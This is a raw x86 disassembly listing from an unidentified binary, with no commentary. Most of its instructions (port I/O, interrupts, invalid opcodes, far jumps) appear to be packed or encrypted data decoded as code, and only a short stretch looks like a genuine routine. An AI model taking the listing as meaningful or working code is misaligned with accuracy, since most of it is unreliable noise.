  40d7c6:	xchg   BYTE PTR [esi-0x76ed10f2],ch
  40d7cc:	jle    0x40d7dc
  40d7ce:	in     al,0x3f
  40d7d0:	aas    
  40d7d1:	push   ebx
  40d7d2:	xchg   ebx,eax
  40d7d3:	stc    
  40d7d4:	pop    DWORD PTR ds:0xc774faf3
  40d7da:	xor    bh,cl
  40d7dc:	int    0x45
  40d7de:	mov    esp,0x8c8b5884
  40d7e3:	sub    ecx,ecx
  40d7e5:	in     eax,dx
  40d7e6:	or     eax,0x6ca81f26
  40d7eb:	mov    esi,0x33c34447
  40d7f0:	int3   
  40d7f1:	fwait
  40d7f2:	stc    
  40d7f3:	imul   eax,DWORD PTR [ecx+0x4e],0x54
  40d7f7:	sahf   
  40d7f8:	ds sbb eax,0x1f67e6cb
  40d7fe:	retf   
  40d7ff:	mov    edx,0xb3a9ad24
  40d804:	sub    bl,BYTE PTR [esi-0x35]
  40d807:	push   ebx
  40d808:	into   
  40d809:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d80a:	stos   DWORD PTR es:[edi],eax
  40d80b:	daa    
  40d80c:	iret   
  40d80d:	mov    esp,0x4c4479e0
  40d812:	ins    BYTE PTR es:[edi],dx
  40d813:	push   edx
  40d814:	mov    esi,0xdb287b84
  40d819:	rol    BYTE PTR [ebp-0x5c],cl
  40d81c:	mov    ds:0x38fa4bdf,al
  40d821:	jne    0x40d7e9
  40d823:	adc    DWORD PTR [ebx+0x2f3de4f1],ebx
  40d829:	adc    dh,dl
  40d82b:	ins    BYTE PTR es:[edi],dx
  40d82c:	shr    DWORD PTR [edi+0x68],0xb5
  40d830:	es jmp 0xe6a3:0xcb17dcf1
  40d838:	ret    
  40d839:	loope  0x40d837
  40d83b:	clc    
  40d83c:	jo     0x40d86a
  40d83e:	int    0x6e
  40d840:	inc    ebx
  40d841:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d842:	inc    edx
  40d843:	pop    ds
  40d844:	out    0x17,eax
  40d846:	xchg   esp,eax
  40d847:	and    BYTE PTR [esi+0x5],0xf8
  40d84b:	sub    BYTE PTR [ebx+0x2233b20],ch
  40d851:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40d853:	push   edi
  40d854:	sbb    al,0xee
  40d856:	and    BYTE PTR [ecx-0x78d7387f],0x20
  40d85d:	pusha  
  40d85e:	mov    ds:0x57a0a725,al
  40d863:	sbb    al,BYTE PTR [eax+0x29]
  40d866:	outs   dx,BYTE PTR ds:[esi]
  40d867:	xor    eax,0xd81a3b31
  40d86c:	and    al,0x97
  40d86e:	or     DWORD PTR [ebx+0x17],esp
  40d871:	or     DWORD PTR [esi-0x9b744a],edi
  40d877:	in     al,dx
  40d878:	inc    ecx
  40d879:	xor    eax,0xdec53015
  40d87e:	and    eax,0xb06b0b06
  40d883:	mov    ecx,0xb887018c
  40d888:	stos   BYTE PTR es:[edi],al
  40d889:	mov    edi,0x6404a472
  40d88e:	aas    
  40d88f:	dec    ecx
  40d890:	sub    DWORD PTR [ebp-0x1bd617a9],ebp
  40d896:	jo     0x40d88a
  40d898:	dec    esp
  40d899:	inc    ebp
  40d89a:	fstp   TBYTE PTR [ecx+eax*1-0x33619280]
  40d8a1:	inc    ebp
  40d8a2:	xlat   BYTE PTR ds:[ebx]
  40d8a3:	in     al,dx
  40d8a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8a5:	jg     0x40d8e3
  40d8a7:	imul   esp,DWORD PTR [ebx-0x5b],0xa9b66477
  40d8ae:	mov    ds:0x49ed00f7,eax
  40d8b3:	push   esp
  40d8b4:	push   esp
  40d8b5:	sub    ah,ah
  40d8b7:	push   esp
  40d8b8:	xor    al,BYTE PTR [edx]
  40d8ba:	fiadd  WORD PTR ds:0x74364351
  40d8c0:	push   esi
  40d8c1:	adc    ebp,DWORD PTR [esi+0x24661b5c]
  40d8c7:	std    
  40d8c8:	mov    ebp,0x73781689
  40d8cd:	push   ecx
  40d8ce:	ror    BYTE PTR [ecx+edi*2],0xca
  40d8d2:	push   es
  40d8d3:	fnstsw WORD PTR [ecx+0x43]
  40d8d6:	xor    ebp,DWORD PTR [ebx+esi*8+0x4867029f]
  40d8dd:	loopne 0x40d873
  40d8df:	adc    DWORD PTR [esi-0x6],ebp
  40d8e2:	dec    ecx
  40d8e3:	sahf   
  40d8e4:	cmp    bh,BYTE PTR [ebx]
  40d8e6:	dec    ebx
  40d8e7:	jo     0x40d8bd
  40d8e9:	test   BYTE PTR [eax],ch
  40d8eb:	in     eax,0x71
  40d8ed:	out    dx,al
  40d8ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8ef:	inc    edx
  40d8f0:	retf   
  40d8f1:	xchg   ebp,eax
  40d8f2:	xchg   edi,eax
  40d8f3:	nop
  40d8f4:	inc    ecx
  40d8f5:	add    BYTE PTR [edi+0x40b9aa58],bl
  40d8fb:	jb     0x40d8b9
  40d8fd:	sbb    ch,BYTE PTR [ecx+0x3f323d5c]
  40d903:	dec    esi
  40d904:	or     DWORD PTR [ebx],eax
  40d906:	popa   
  40d907:	clc    
  40d908:	adc    DWORD PTR [esi],0x6933bdc3
  40d90e:	or     bl,bl
  40d910:	mov    al,0xf
  40d912:	mov    dl,ch
  40d914:	outs   dx,DWORD PTR ds:[esi]
  40d915:	and    DWORD PTR [ebp+0x28],esp
  40d918:	loopne 0x40d94b
  40d91a:	rcl    BYTE PTR [edx],0xc2
  40d91d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d91e:	icebp  
  40d91f:	adc    BYTE PTR [ecx-0x53],dh
  40d922:	sbb    BYTE PTR [edi+ebp*2-0x531818c4],dh
  40d929:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d92a:	cmp    al,0x95
  40d92c:	and    BYTE PTR [edi],ah
  40d92e:	cld    
  40d92f:	jbe    0x40d927
  40d931:	xor    dl,BYTE PTR [ebx+0x23]
  40d934:	stos   DWORD PTR es:[edi],eax
  40d935:	push   ebx
  40d936:	lock (bad) 
  40d938:	ins    BYTE PTR es:[edi],dx
  40d939:	cli    
  40d93a:	or     al,0x33
  40d93c:	jl     0x40d96a
  40d93e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d93f:	imul   esi,DWORD PTR [ecx+0x73aaf4a3],0x6
  40d946:	inc    ebx
  40d947:	mov    al,0x41
  40d949:	adc    al,0xd7
  40d94b:	out    dx,al
  40d94c:	and    BYTE PTR [esi+0x3ca288eb],cl
  40d952:	sub    DWORD PTR ds:[ebx-0x1],edi
  40d956:	mov    eax,ds:0xdc42c74
  40d95b:	mov    bh,0x3d
  40d95d:	cli    
  40d95e:	sbb    DWORD PTR [esi-0x4d6abacc],esp
  40d964:	adc    DWORD PTR [edx],eax
  40d966:	outs   dx,DWORD PTR ds:[esi]
  40d967:	mov    dh,0x83
  40d969:	test   esp,ecx
  40d96b:	push   ebx
  40d96c:	loopne 0x40d991
  40d96e:	test   ebp,0x3db2e16c
  40d974:	loope  0x40d96a
  40d976:	jp     0x40d8fb
  40d978:	daa    
  40d979:	test   DWORD PTR [esi],ebx
  40d97b:	shl    BYTE PTR [edx],1
  40d97d:	xchg   BYTE PTR [ebx+0x53],ah
  40d980:	sbb    edx,esp
  40d982:	and    al,0xf5
  40d984:	cdq    
  40d985:	imul   ebp,ebx,0xe57e60d4
  40d98b:	cld    
  40d98c:	xor    bh,BYTE PTR [ebx-0x350971a5]
  40d992:	cli    
  40d993:	adc    eax,0xe3944b
  40d998:	cli    
  40d999:	add    al,0x9d
  40d99b:	aas    
  40d99c:	cmp    dl,ch
  40d99e:	sar    DWORD PTR [edx],cl
  40d9a0:	cmp    BYTE PTR [ebp+edi*8-0x2bb706a9],bh
  40d9a7:	push   ecx
  40d9a8:	jno    0x40d94c
  40d9aa:	xor    al,0x3c
  40d9ac:	fisttp WORD PTR [edi-0x6a06c6db]
  40d9b2:	mov    bl,0xbd
  40d9b4:	out    0x91,al
  40d9b6:	sub    bl,bl
  40d9b8:	mov    ebx,0x4fbfcb19
  40d9bd:	cmp    esi,DWORD PTR [esi+ecx*2]
  40d9c0:	push   edx
  40d9c1:	aam    0xba
  40d9c3:	inc    edx
  40d9c4:	mov    ah,0x97
  40d9c6:	pop    ds
  40d9c7:	push   ds
  40d9c8:	ins    BYTE PTR es:[edi],dx
  40d9c9:	outs   dx,DWORD PTR ds:[esi]
  40d9ca:	pop    es
  40d9cb:	or     eax,0x66c2d6b9
  40d9d0:	mov    ch,BYTE PTR [ebx]
  40d9d2:	jmp    DWORD PTR [ecx+0x1441a767]
  40d9d8:	mov    bl,0x37
  40d9da:	jo     0x40d9d2
  40d9dc:	or     eax,0x1f048e97
  40d9e1:	call   0x4056:0x35253058
  40d9e8:	out    dx,eax
  40d9e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9ea:	in     al,dx
  40d9eb:	mov    ah,0x88
  40d9ed:	mov    ebp,0x9925d086
  40d9f2:	(bad)  
  40d9f3:	int    0x1c
  40d9f5:	jecxz  0x40da34
  40d9f7:	(bad)  
  40d9f8:	fs dec edx
  40d9fa:	mov    DWORD PTR [ebp+0x14],ecx
  40d9fd:	xor    eax,eax
  40d9ff:	or     DWORD PTR [ebp+0x14],eax
  40da02:	mov    eax,DWORD PTR [ebp-0x50]
  40da05:	mov    ecx,DWORD PTR [ebp-0x4c]
  40da08:	shrd   eax,ecx,0x2
  40da0c:	shr    ecx,0x2
  40da0f:	mov    cx,ax
  40da12:	mov    eax,DWORD PTR [ebp-0x50]
  40da15:	mov    edx,0x655c
  40da1a:	xor    cx,dx
  40da1d:	jmp    0x40dfa7
  40da22:	sbb    DWORD PTR [edx+ebx*1+0x623918bf],0x20
  40da2a:	das    
  40da2b:	je     0x888f57e3
  40da31:	mov    dl,0xfd
  40da33:	stos   BYTE PTR es:[edi],al
  40da34:	push   ss
  40da35:	push   ss
  40da36:	cmp    eax,0xa0161604
  40da3b:	clc    
  40da3c:	sbb    al,0xe7
  40da3e:	jmp    0xb60:0x89eb6c49
  40da45:	pushf  
  40da46:	hlt    
  40da47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da48:	sub    dl,BYTE PTR [ebp+0x39fea511]
  40da4e:	mov    eax,ds:0x647b3937
  40da53:	adc    ebp,DWORD PTR [edi-0x61db69cb]
  40da59:	sub    eax,DWORD PTR [edi+ebp*8-0x114aaf5a]
  40da60:	mov    esp,ebx
  40da62:	jo     0x40da7c
  40da64:	mov    cl,bl
  40da66:	daa    
  40da67:	mov    al,ds:0x732fe71c
  40da6c:	cld    
  40da6d:	mov    ecx,0x31643e3
  40da72:	popf   
  40da73:	test   BYTE PTR [esi-0x4],dh
  40da76:	enter  0xa9ee,0xfa
  40da7a:	mov    ch,0xcc
  40da7c:	jecxz  0x40dac0
  40da7e:	mov    ebp,0xeceb451f
  40da83:	mov    bl,0x39
  40da85:	loopne 0x40da0b
  40da87:	lods   al,BYTE PTR ds:[esi]
  40da88:	xchg   ebx,eax
  40da89:	sub    al,0x8d
  40da8b:	inc    eax
  40da8c:	pop    ebp
  40da8d:	xchg   esi,eax
  40da8e:	xor    eax,0x436a333e
  40da93:	cmp    DWORD PTR [ebx-0x1c5e3b46],ebp
  40da99:	cmp    BYTE PTR [edx-0x64],dl
  40da9c:	dec    ebp
  40da9d:	in     al,0xfe
  40da9f:	cmc    
  40daa0:	jnp    0x40daae
  40daa2:	mov    esi,ecx
  40daa4:	lahf   
  40daa5:	iret   
  40daa6:	(bad)  
  40daa7:	rcr    BYTE PTR [esi+eiz*4+0x2e],1
  40daab:	mov    eax,0x9cc5239
  40dab0:	mov    esi,0x8b57f46f
  40dab5:	xlat   BYTE PTR ds:[ebx]
  40dab6:	loop   0x40da58
  40dab8:	mov    ah,0xa5
  40daba:	and    bl,dl
  40dabc:	sar    esp,0x12
  40dabf:	lea    edi,[ebx+0x619f3c77]
  40dac5:	sbb    al,cl
  40dac7:	fs or  esp,ebx
  40daca:	adc    ah,BYTE PTR [edi-0x74]
  40dacd:	dec    esp
  40dace:	or     ah,BYTE PTR [ebp-0x74]
  40dad1:	(bad)  
  40dad2:	cmp    BYTE PTR [edx],ah
  40dad4:	mov    ebp,0xcca48637
  40dad9:	popa   
  40dada:	mov    edx,0x6d8360ea
  40dadf:	bound  ebp,QWORD PTR [edi-0x7e8766c0]
  40dae5:	data16 aam 0xec
  40dae8:	sub    esi,DWORD PTR [ebx+0x6b]
  40daeb:	jge    0x40db65
  40daed:	xchg   ebx,eax
  40daee:	addr16 add ch,ah
  40daf1:	lods   al,BYTE PTR ds:[esi]
  40daf2:	add    al,0x1
  40daf4:	mov    al,0xa4
  40daf6:	(bad)  
  40daf7:	lock add DWORD PTR ds:0x71aecae5,0xe67ec9a0
  40db02:	or     al,0x16
  40db04:	int3   
  40db05:	shl    DWORD PTR [edx+0x5f],1
  40db08:	mov    ebx,0x850d337e
  40db0d:	frstor [eax+0x31]
  40db10:	out    0xa3,al
  40db12:	pop    ds
  40db13:	mov    DWORD PTR [ebx+edx*4],ebp
  40db16:	arpl   WORD PTR ds:0xc104a989,bx
  40db1c:	cmp    DWORD PTR [edx],eax
  40db1e:	sub    DWORD PTR [esi+0x6fc810c7],esi
  40db24:	fisubr DWORD PTR [edi-0x77daed85]
  40db2a:	jbe    0x40db15
  40db2c:	sti    
  40db2d:	sbb    eax,0xd3256a7c
  40db32:	push   ecx
  40db33:	ins    BYTE PTR es:[edi],dx
  40db34:	aaa    
  40db35:	xor    al,0x8a
  40db37:	inc    eax
  40db38:	imul   ebx,DWORD PTR [edx-0x7d3a2839],0x64
  40db3f:	mov    dl,0xee
  40db41:	xchg   esi,eax
  40db42:	xchg   DWORD PTR [ebx],ecx
  40db44:	test   al,0xd8
  40db46:	pop    eax
  40db47:	scas   al,BYTE PTR es:[edi]
  40db48:	ja     0x40db27
  40db4a:	cs in  al,dx
  40db4c:	out    dx,eax
  40db4d:	cmp    al,0xf7
  40db4f:	mov    BYTE PTR [ebx],bl
  40db51:	and    DWORD PTR [edx],edi
  40db53:	add    DWORD PTR [ecx+eax*8-0x10],edx
  40db57:	mov    esi,0x5d218a03
  40db5c:	cmp    ecx,DWORD PTR [ecx]
  40db5e:	pop    eax
  40db5f:	cmp    esp,DWORD PTR [edi+eax*4-0x5e]
  40db63:	sub    ch,al
  40db65:	or     DWORD PTR ds:0xe1c58e6e,0xadde580d
  40db6f:	mov    bl,0x4b
  40db71:	ja     0xbfcd365f
  40db77:	mov    esi,DWORD PTR [eax+0x798222b2]
  40db7d:	test   DWORD PTR [edi+edi*1+0x6d],0xf843d83f
  40db85:	and    ebp,0x4e
  40db88:	add    eax,0x50f2abe2
  40db8d:	cwde   
  40db8e:	jp     0x40dbac
  40db90:	cmp    al,0x8e
  40db92:	sub    BYTE PTR [ebp-0x5d],bl
  40db95:	add    al,0x74
  40db97:	push   eax
  40db98:	stc    
  40db99:	adc    esi,ebp
  40db9b:	in     al,dx
  40db9c:	xor    BYTE PTR [esi],al
  40db9e:	ror    DWORD PTR ds:0xaa12d728,1
  40dba4:	dec    esp
  40dba5:	scas   al,BYTE PTR es:[edi]
  40dba6:	xchg   ebp,eax
  40dba7:	sub    BYTE PTR [ebx+0x68203b85],bh
  40dbad:	ds mov ebp,0xad0dc73e
  40dbb3:	pop    esp
  40dbb4:	dec    ebp
  40dbb5:	pop    esp
  40dbb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbb7:	cmp    al,0x49
  40dbb9:	xor    BYTE PTR ds:0x966af6e4,al
  40dbbf:	dec    ebp
  40dbc0:	mov    BYTE PTR [edi+0x4decbeaf],bl
  40dbc6:	ins    BYTE PTR es:[edi],dx
  40dbc7:	retf   
  40dbc8:	sbb    BYTE PTR [edi],bl
  40dbca:	dec    esp
  40dbcb:	push   cs
  40dbcc:	pop    eax
  40dbcd:	daa    
  40dbce:	xchg   BYTE PTR [edx],ah
  40dbd0:	pop    ds
  40dbd1:	xchg   DWORD PTR fs:[edx],eax
  40dbd4:	fwait
  40dbd5:	das    
  40dbd6:	inc    eax
  40dbd7:	ret    0xf01c
  40dbda:	popf   
  40dbdb:	cmp    eax,0x5728f4d6
  40dbe0:	xchg   ebx,eax
  40dbe1:	inc    ebx
  40dbe2:	xor    al,0xde
  40dbe4:	mov    dl,0xe9
  40dbe6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbe7:	bound  esp,QWORD PTR gs:0xcdca08ba
  40dbee:	push   ecx
  40dbef:	out    dx,eax
  40dbf0:	add    eax,0x82fbb3ad
  40dbf5:	push   edi
  40dbf6:	mov    cl,0x85
  40dbf8:	lahf   
  40dbf9:	jnp    0x40dc5a
  40dbfb:	mov    ecx,0x24231957
  40dc00:	jns    0x40dbf9
  40dc02:	loopne 0x40dbab
  40dc04:	xlat   BYTE PTR ds:[ebx]
  40dc05:	cmp    al,0x5a
  40dc07:	dec    edi
  40dc08:	scas   eax,DWORD PTR es:[edi]
  40dc09:	inc    eax
  40dc0a:	int    0x6d
  40dc0c:	(bad)  
  40dc0d:	xor    edi,DWORD PTR [ebp-0x33]
  40dc10:	push   ebp
  40dc11:	inc    DWORD PTR [ecx+0x41]
  40dc14:	pop    ss
  40dc15:	or     DWORD PTR [ebp+0x1e],edi
  40dc18:	sub    al,0x1e
  40dc1a:	or     esp,edx
  40dc1c:	adc    ch,BYTE PTR [eax+0x5a]
  40dc1f:	loope  0x40dc1e
  40dc21:	rcr    BYTE PTR [esi+0x27],1
  40dc24:	icebp  
  40dc25:	dec    BYTE PTR [edi+0x2f]
  40dc28:	cmp    ebx,esp
  40dc2a:	les    ecx,FWORD PTR [esi]
  40dc2c:	adc    al,0x9c
  40dc2e:	(bad)  [edi]
  40dc30:	popaw  
  40dc32:	addr16 cs pop eax
  40dc35:	inc    edi
  40dc36:	scas   eax,DWORD PTR es:[edi]
  40dc37:	jno    0x40dc9b
  40dc39:	(bad)  
  40dc3a:	addr16 cld 
  40dc3c:	ja     0x40dcbb
  40dc3e:	not    BYTE PTR [eax+0x4d362c8b]
  40dc44:	lods   eax,DWORD PTR ds:[esi]
  40dc45:	(bad)  
  40dc47:	gs mov esi,0x6d317ef1
  40dc4d:	std    
  40dc4e:	ja     0x40dbf2
  40dc50:	popa   
  40dc51:	iret   
  40dc52:	jns    0x40dc2b
  40dc54:	jge    0x40dc72
  40dc56:	rol    BYTE PTR [eax-0xca630d8],0x59
  40dc5d:	test   al,0x8a
  40dc5f:	cmp    al,0x8e
  40dc61:	mov    esp,0x16dce7c0
  40dc66:	int3   
  40dc67:	pop    esp
  40dc68:	jb     0x40dc0c
  40dc6a:	cwde   
  40dc6b:	pop    ebp
  40dc6c:	mov    ecx,0x30d00268
  40dc71:	rcl    BYTE PTR [edi+ecx*8+0x2df497e4],cl
  40dc78:	jmp    0xfad4fd26
  40dc7d:	cmp    edx,DWORD PTR [edi-0x183d8348]
  40dc83:	imul   esp,DWORD PTR [ebp-0x7e654703],0xffffffba
  40dc8a:	push   esp
  40dc8b:	sahf   
  40dc8c:	adc    DWORD PTR [eax-0x1002a511],0x385fdc9
  40dc96:	mov    BYTE PTR cs:[bp+di+0x29],ch
  40dc9b:	bound  ebp,QWORD PTR [esi]
  40dc9d:	and    BYTE PTR ds:0xa1fcc404,bh
  40dca3:	aad    0x62
  40dca5:	outs   dx,DWORD PTR ds:[esi]
  40dca6:	jle    0x40dd21
  40dca8:	pusha  
  40dca9:	popf   
  40dcaa:	dec    esi
  40dcab:	iret   
  40dcac:	mov    esp,0x5335ef12
  40dcb1:	out    0x2,al
  40dcb3:	xchg   esp,eax
  40dcb4:	push   ecx
  40dcb5:	push   eax
  40dcb6:	add    ch,ah
  40dcb8:	cmp    BYTE PTR [ebp-0x2],bl
  40dcbb:	and    ecx,esp
  40dcbd:	push   ss
  40dcbe:	test   eax,edx
  40dcc0:	(bad)  [ebp+ebx*8-0x69]
  40dcc4:	jnp    0x40dc9f
  40dcc6:	mov    cl,BYTE PTR [eax-0x27]
  40dcc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcca:	push   ds
  40dccb:	jnp    0x40dcb0
  40dccd:	mov    bh,0x4a
  40dccf:	xor    eax,0x1daaa08
  40dcd4:	push   ss
  40dcd5:	jp     0x40dd13
  40dcd7:	out    dx,eax
  40dcd8:	adc    edi,DWORD PTR [edx+0x36]
  40dcdb:	test   DWORD PTR [ecx+0x6360d492],edx
  40dce1:	lock fsubr QWORD PTR [ebp-0x5e]
  40dce5:	mov    bl,0x27
  40dce7:	inc    eax
  40dce8:	popa   
  40dce9:	popf   
  40dcea:	push   eax
  40dceb:	pop    esi
  40dcec:	out    dx,eax
  40dced:	aaa    
  40dcee:	mov    eax,0xb9db4d23
  40dcf3:	mov    edi,0xcf94fe09
  40dcf8:	dec    ebp
  40dcf9:	mov    esp,0x79152d45
  40dcfe:	cmc    
  40dcff:	xchg   esp,eax
  40dd00:	inc    edi
  40dd01:	pop    esp
  40dd02:	jle    0x40dcbf
  40dd04:	ret    0x4e92
  40dd07:	fisub  DWORD PTR [ebx-0x53]
  40dd0a:	adc    eax,0xe1907a5c
  40dd0f:	or     cl,ch
  40dd11:	mov    esp,0xf8d989ac
  40dd16:	into   
  40dd17:	cmp    eax,0x59943606
  40dd1c:	ss push edi
  40dd1e:	test   BYTE PTR [ebp-0x67],ah
  40dd21:	xchg   ecx,eax
  40dd22:	dec    eax
  40dd23:	inc    eax
  40dd24:	xlat   BYTE PTR ds:[ebx]
  40dd25:	or     BYTE PTR [ecx+0x41],0x9
  40dd29:	rcr    DWORD PTR [ecx+0x1],0xe1
  40dd2d:	mov    bh,0xc1
  40dd2f:	pop    ss
  40dd30:	(bad)  
  40dd31:	push   esp
  40dd32:	jbe    0x40dd2d
  40dd34:	pop    ss
  40dd35:	lods   eax,DWORD PTR ds:[esi]
  40dd36:	retf   
  40dd37:	shl    ebx,0xc1
  40dd3a:	pop    es
  40dd3b:	xor    DWORD PTR [esp+esi*2+0x52],edx
  40dd3f:	stos   DWORD PTR es:[edi],eax
  40dd40:	mov    esi,ebp
  40dd42:	popf   
  40dd43:	sahf   
  40dd44:	adc    DWORD PTR gs:0xc6fe8e0d,edi
  40dd4b:	mov    ch,0x92
  40dd4d:	xor    DWORD PTR [edx-0x3c],edx
  40dd50:	xor    dl,BYTE PTR [edi]
  40dd52:	fst    DWORD PTR cs:[ecx-0x66]
  40dd56:	ss repnz sahf 
  40dd59:	outs   dx,BYTE PTR ds:[esi]
  40dd5a:	in     al,0xd3
  40dd5c:	add    BYTE PTR [eax],0xe1
  40dd5f:	popf   
  40dd60:	retf   
  40dd61:	int3   
  40dd62:	mov    ah,0xe9
  40dd64:	or     ecx,edx
  40dd66:	push   ds
  40dd67:	iret   
  40dd68:	leave  
  40dd69:	and    dh,BYTE PTR [eax-0x78]
  40dd6c:	or     al,0x85
  40dd6e:	inc    ebx
  40dd6f:	jl     0x40dd8b
  40dd71:	dec    DWORD PTR [ebx+0x13d2dc7d]
  40dd77:	sub    eax,0xba093494
  40dd7c:	inc    BYTE PTR gs:[edx+0x7e7df6b9]
  40dd83:	and    al,BYTE PTR [edx]
  40dd85:	jecxz  0x40dd8d
  40dd87:	xor    ah,ah
  40dd89:	dec    eax
  40dd8a:	mov    bh,0x1a
  40dd8c:	mov    esi,0xf19f0ccb
  40dd91:	enter  0x1b80,0x58
  40dd95:	sub    al,0x2e
  40dd97:	les    edi,FWORD PTR [ebx-0x661b9003]
  40dd9d:	fst    DWORD PTR [ecx-0x7b]
  40dda0:	jmp    0x40dd43
  40dda2:	loopne 0x40dd70
  40dda4:	jl     0x40dd96
  40dda6:	inc    edi
  40dda7:	fwait
  40dda8:	outs   dx,DWORD PTR ds:[esi]
  40dda9:	cli    
  40ddaa:	or     eax,0xf17ba0a2
  40ddaf:	xchg   edx,eax
  40ddb0:	sahf   
  40ddb1:	pop    edi
  40ddb2:	or     esp,ebx
  40ddb4:	xor    BYTE PTR ds:0x65da1c4e,0x53
  40ddbb:	adc    BYTE PTR [ebp-0x79ddd22],al
  40ddc1:	fld    TBYTE PTR [ecx-0x100f7bd1]
  40ddc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddc8:	or     ebp,ebp
  40ddca:	pop    ecx
  40ddcb:	ret    0x69de
  40ddce:	pop    ebp
  40ddcf:	xor    eax,0x9af77003
  40ddd4:	dec    edx
  40ddd5:	gs mov bl,dl
  40ddd8:	or     esi,edx
  40ddda:	sbb    edi,ecx
  40dddc:	add    DWORD PTR [esp+eax*4],ebp
  40dddf:	xchg   ebx,esi
  40dde1:	and    bh,BYTE PTR ds:0x970c6d56
  40dde7:	sbb    eax,0x85153ac9
  40ddec:	les    eax,FWORD PTR [eax+0x25f0ea91]
  40ddf2:	pop    es
  40ddf3:	and    cl,dh
  40ddf5:	xchg   ecx,eax
  40ddf6:	mov    eax,0x211f0043
  40ddfb:	pop    ss
  40ddfc:	int3   
  40ddfd:	rol    DWORD PTR [ebx+0x59a28a9f],1
  40de03:	push   ebp
  40de04:	xor    al,ah
  40de06:	pop    ecx
  40de07:	dec    esp
  40de08:	dec    esp
  40de09:	mov    eax,0xbc1cedc
  40de0e:	mov    esi,0xfb847bdc
  40de13:	inc    ebx
  40de14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de15:	cmp    eax,0xf1472c31
  40de1a:	imul   ebx,DWORD PTR [ebx-0x6348fcb1],0xffffffb7
  40de21:	xchg   ecx,eax
  40de22:	cdq    
  40de23:	das    
  40de24:	mov    eax,0xa5531674
  40de29:	mov    DWORD PTR [edi+ebx*2+0x67],edx
  40de2d:	stc    
  40de2e:	dec    edx
  40de2f:	add    dl,BYTE PTR [edx-0x5d7587e4]
  40de35:	sbb    eax,0x741e864
  40de3a:	ins    BYTE PTR es:[edi],dx
  40de3b:	add    DWORD PTR [ebx],edi
  40de3d:	in     eax,dx
  40de3e:	jmp    0x40ddd5
  40de40:	fucomi st,st(4)
  40de42:	out    dx,eax
  40de43:	aad    0xe5
  40de45:	jo     0x40de54
  40de47:	iret   
  40de48:	sub    BYTE PTR [edx-0x7f],ch
  40de4b:	test   al,0xad
  40de4d:	jle    0x40de30
  40de4f:	jne    0x40dea5
  40de51:	sbb    esi,edi
  40de53:	inc    ebp
  40de54:	and    al,BYTE PTR [ecx-0x56]
  40de57:	mov    ch,0x42
  40de59:	inc    ebx
  40de5a:	pop    esp
  40de5b:	aas    
  40de5c:	ror    BYTE PTR ds:0x9b9017e7,0x2a
  40de63:	mov    dl,0x97
  40de65:	lods   al,BYTE PTR ds:[esi]
  40de66:	ja     0x40de12
  40de68:	sbb    eax,0x1ca015cb
  40de6d:	aam    0x29
  40de6f:	popa   
  40de70:	pop    ecx
  40de71:	es cmp ebp,edi
  40de74:	fild   DWORD PTR [ebx]
  40de76:	ja     0x40ddf8
  40de78:	ja     0x40debc
  40de7a:	inc    ebx
  40de7b:	and    DWORD PTR [esi],ebp
  40de7d:	ins    BYTE PTR es:[edi],dx
  40de7e:	cli    
  40de7f:	push   ebp
  40de80:	js     0x40de2b
  40de82:	mov    al,0xd8
  40de84:	sub    DWORD PTR [ebx+esi*2-0x73],edi
  40de88:	sahf   
  40de89:	or     BYTE PTR [ecx+0x326f87bf],ah
  40de8f:	xchg   edi,eax
  40de90:	cmp    DWORD PTR [edi+0xc],ecx
  40de93:	std    
  40de94:	jmp    0x40de6a
  40de96:	mov    esi,0xaafaeb2f
  40de9b:	cwde   
  40de9c:	pop    ecx
  40de9d:	lea    ecx,[edx+0x6c4a37bb]
  40dea3:	sub    edi,DWORD PTR [esi]
  40dea5:	add    BYTE PTR [ebx-0x44a6808f],ch
  40deab:	jbe    0x40de8c
  40dead:	and    eax,0xf35ed0b
  40deb2:	push   es
  40deb3:	clc    
  40deb4:	mov    ah,0x2a
  40deb6:	ret    0xc7b7
  40deb9:	mov    ebp,0x98f14397
  40debe:	pusha  
  40debf:	stc    
  40dec0:	xchg   ebx,eax
  40dec1:	loope  0x40def6
  40dec3:	fld    QWORD PTR [edi+eax*8+0x4ae4288d]
  40deca:	es mov dl,0xe5
  40decd:	inc    esp
  40dece:	mov    WORD PTR [eax],ds
  40ded0:	fistp  QWORD PTR [esi]
  40ded2:	out    0x70,al
  40ded4:	hlt    
  40ded5:	mov    ebx,edi
  40ded7:	pop    ds
  40ded8:	cmp    al,BYTE PTR [edx+0x17]
  40dedb:	sub    eax,0x6b07e781
  40dee0:	add    al,0x3d
  40dee2:	scas   eax,DWORD PTR es:[edi]
  40dee3:	cli    
  40dee4:	pop    es
  40dee5:	scas   eax,DWORD PTR es:[edi]
  40dee6:	out    dx,al
  40dee7:	fidiv  WORD PTR [edx+0x64]
  40deea:	dec    ebp
  40deeb:	push   esi
  40deec:	mov    eax,0xfb578fbe
  40def1:	inc    ebx
  40def2:	stos   BYTE PTR es:[edi],al
  40def3:	xchg   DWORD PTR [ebx],esp
  40def5:	in     al,dx
  40def6:	scas   eax,DWORD PTR es:[edi]
  40def7:	loope  0x40dec5
  40def9:	jmp    0x9ece:0x48a756fb
  40df00:	pop    eax
  40df01:	outs   dx,DWORD PTR ds:[esi]
  40df02:	div    BYTE PTR [edx-0x622295a6]
  40df08:	in     al,0x84
  40df0a:	jge    0x40df55
  40df0c:	mov    bh,0x2f
  40df0e:	mov    cs,WORD PTR [esi+0x38]
  40df11:	jecxz  0x40deff
  40df13:	aaa    
  40df14:	pop    ebx
  40df15:	and    esp,DWORD PTR [ebx-0x2]
  40df18:	inc    esi
  40df19:	(bad)  
  40df1a:	adc    DWORD PTR [edx+0x7af92d09],eax
